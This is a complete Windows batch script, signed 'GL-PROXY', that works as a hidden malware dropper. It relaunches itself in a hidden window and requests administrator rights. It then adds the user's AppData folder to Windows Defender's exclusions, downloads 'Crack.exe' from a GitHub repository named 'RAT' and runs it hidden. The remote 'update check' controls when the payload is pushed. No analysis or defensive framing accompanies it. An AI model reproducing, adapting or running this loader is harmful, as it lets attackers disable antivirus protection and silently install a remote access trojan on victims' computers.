@echo off
SETLOCAL
if not "%~1"=="HIDDEN_LAUNCH" (
    powershell.exe -WindowStyle Hidden -Command "Start-Process -FilePath '%~f0' -ArgumentList 'HIDDEN_LAUNCH'"
    exit /b
)
SET "APPDATA_ROOT_PATH=%USERPROFILE%\AppData"
SET "LOCAL_FILE=%APPDATA_ROOT_PATH%\Roaming\Windows\update.txt"
SET "UPDATE_CHECK_URL=https://raw.githubusercontent.com/GLICHED-HACKER/RAT/refs/heads/main/UpdateChecks"
SET "DOWNLOAD_URL=https://github.com/GLICHED-HACKER/RAT/raw/main/Crack.exe"
SET "PROCESS_TO_KILL_NAME=WinSystem32.exe"
SET "TARGET_FILE=%APPDATA_ROOT_PATH%\Crack.exe"
:CheckInternet
ping -n 1 8.8.8.8 >nul
if errorlevel 1 (
    timeout /t 5 /nobreak >nul
    goto CheckInternet
)
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$localFilePath = '%LOCAL_FILE%'; $updateCheckUrl = '%UPDATE_CHECK_URL%'; try { $remoteContent = (Invoke-WebRequest -Uri $updateCheckUrl -UseBasicParsing).Content; $localContent = if (Test-Path $localFilePath) { Get-Content $localFilePath -Raw } else { '' }; if ($localContent -ne $remoteContent) { exit 1 } else { exit 0 }; } catch { exit 0; }"
if %errorlevel% NEQ 1 (
    exit /b
)
net session >nul 2>&1
if errorlevel 1 (
    powershell -WindowStyle Hidden -Command "Start-Process -FilePath '%~f0' -Verb runAs"
    exit /b
)
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "try { Invoke-WebRequest -Uri '%UPDATE_CHECK_URL%' -OutFile '%LOCAL_FILE%' -UseBasicParsing | Out-Null; } catch { }"
taskkill /F /IM "%PROCESS_TO_KILL_NAME%" >nul 2>&1
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "try { Add-MpPreference -ExclusionPath '%APPDATA_ROOT_PATH%' -ErrorAction SilentlyContinue | Out-Null; } catch { }"
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "try { (New-Object System.Net.WebClient).DownloadFile('%DOWNLOAD_URL%', '%TARGET_FILE%'); } catch { }"
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "try { if (Test-Path '%TARGET_FILE%') { Start-Process -FilePath '%TARGET_FILE%' -WindowStyle Hidden; }; } catch { }"
ENDLOCAL

:: By GL-PROXY
:: v1
